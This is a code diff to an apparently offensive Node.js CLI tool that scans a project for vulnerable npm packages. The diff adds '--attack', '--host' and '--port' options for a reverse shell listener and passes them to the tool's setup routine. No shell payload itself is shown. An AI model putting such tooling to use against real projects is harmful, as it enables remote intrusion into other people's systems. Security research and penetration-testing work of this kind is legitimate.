@@ -14,6 +14,9 @@ const cli = meow(chalk.rgb(247, 30, 56)(`
     --entrypoint  -e   Path to file to execute if directory is vulnerable (defaults to index.js)
     --inspect     -i   Enable inspector mode
     --accesstoken -a   Access token for npmjs.com
+    --attack           Whether to attack the project
+    --host             Host IP where the reverse shell lister is running (defaults to localhost)
+    --port             Port where the reverse shell lister is running (defaults to 1456)
 `), {
     importMeta: import.meta,
     description: false,
@@ -34,6 +37,17 @@ const cli = meow(chalk.rgb(247, 30, 56)(`
         accesstoken: {
             type: 'string',
             alias: 'a'
+        },
+        attack: {
+            type: 'boolean',
+        },
+        host: {
+            type: 'string',
+            default: 'localhost'
+        },
+        port: {
+            type: 'number',
+            default: 1456
         }
     }
 });
@@ -54,7 +68,7 @@ function greet() {
 async function start() {
     greet()
     const { flags } = cli;
-    const { directory, entrypoint, accesstoken } = flags;
+    const { directory, entrypoint, accesstoken, attack, host, port } = flags;
 
     if (!directory) {
         console.error(cli.help);
@@ -73,7 +87,12 @@ async function start() {
     if (Object.keys(pkgs).length === 0) {
         log('No vulnerabilities found');
     } else {
-        setup({ pkgs, directory, entrypoint, accesstoken })
+        const shell_data = {
+            attack,
+            host,
+            port
+        }
+        setup({ pkgs, directory, entrypoint, accesstoken, shell_data })
 
     }
     /*
